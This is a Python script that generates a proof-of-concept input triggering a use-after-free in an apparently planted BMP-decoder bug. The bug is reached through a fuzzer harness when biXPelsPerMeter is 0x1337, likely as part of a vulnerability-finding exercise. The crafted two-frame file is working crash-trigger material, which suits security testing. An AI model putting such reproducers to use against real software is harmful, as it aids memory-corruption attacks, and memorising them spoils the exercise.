"""
Generate a PoC binary that triggers the use-after-free in BMPCodec::Decode
multi-frame compositing path.

The fuzzer harness (fuzz_bmp.cc) works as follows:
  1. First 4 bytes = split_offset (LE u32)
  2. Bytes 4..4+split_offset = BMP Frame 1
  3. Bytes 4+split_offset..end = BMP Frame 2

When biXPelsPerMeter == 0x1337:
  - Frame 1 stores a raw pointer to its pixel buffer in g_bmp_state
  - Frame 1's Image is destroyed (pixel buffer freed)
  - Frame 2 reads from the dangling pointer during compositing => UAF
"""
import struct
import sys
import os

def make_bmp_24bit(width, height, xpels=0x1337):
    """Create a minimal valid 24-bit BMP with given biXPelsPerMeter."""
    channels = 3
    row_stride = (width * channels + 3) & ~3
    pixel_data_size = height * row_stride
    file_size = 54 + pixel_data_size

    header = bytearray(54)
    # File header
    header[0:2] = b'BM'
    struct.pack_into('<I', header, 2, file_size)
    struct.pack_into('<I', header, 6, 0)           # reserved
    struct.pack_into('<I', header, 10, 54)          # offset to pixel data

    # Info header (BITMAPINFOHEADER)
    struct.pack_into('<I', header, 14, 40)          # biSize
    struct.pack_into('<i', header, 18, width)       # biWidth
    struct.pack_into('<i', header, 22, height)      # biHeight (positive = bottom-up)
    struct.pack_into('<H', header, 26, 1)           # biPlanes
    struct.pack_into('<H', header, 28, 24)          # biBitCount
    struct.pack_into('<I', header, 30, 0)           # biCompression (BI_RGB)
    struct.pack_into('<I', header, 34, pixel_data_size)  # biSizeImage
    struct.pack_into('<I', header, 38, xpels)       # biXPelsPerMeter = 0x1337
    struct.pack_into('<I', header, 42, 0)           # biYPelsPerMeter
    struct.pack_into('<I', header, 46, 0)           # biClrUsed
    struct.pack_into('<I', header, 50, 0)           # biClrImportant

    # Pixel data: fill with recognizable but valid bytes
    pixels = bytearray(pixel_data_size)
    for y in range(height):
        for x in range(width):
            offset = y * row_stride + x * channels
            pixels[offset] = (x * 37 + y * 53) & 0xFF      # B
            pixels[offset + 1] = (x * 71 + y * 97) & 0xFF  # G
            pixels[offset + 2] = (x * 113 + y * 29) & 0xFF # R

    return bytes(header) + bytes(pixels)


def main():
    # Use 4x4 BMP (small enough to avoid OOM, large enough to trigger compositing)
    bmp1 = make_bmp_24bit(4, 4, xpels=0x1337)
    bmp2 = make_bmp_24bit(4, 4, xpels=0x1337)

    split_offset = len(bmp1)  # = 102 bytes for 4x4x24bit

    # Verify the split logic in the fuzzer harness:
    total_size = 4 + len(bmp1) + len(bmp2)
    effective_split = split_offset % (total_size - 4)
    assert effective_split >= 54, f"split_offset {effective_split} < 54"
    assert effective_split <= total_size - 54, f"split_offset {effective_split} > {total_size - 54}"
    print(f"BMP1 size: {len(bmp1)}")
    print(f"BMP2 size: {len(bmp2)}")
    print(f"split_offset: {split_offset}")
    print(f"effective_split: {effective_split}")
    print(f"total_size: {total_size}")
    print(f"Two-frame path will be taken: YES")

    # Build the PoC binary
    poc = struct.pack('<I', split_offset) + bmp1 + bmp2

    out_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        'uaf_bmp_compositing_poc'
    )
    with open(out_path, 'wb') as f:
        f.write(poc)

    print(f"\nPoC written to: {out_path}")
    print(f"PoC size: {len(poc)} bytes")


if __name__ == '__main__':
    main()
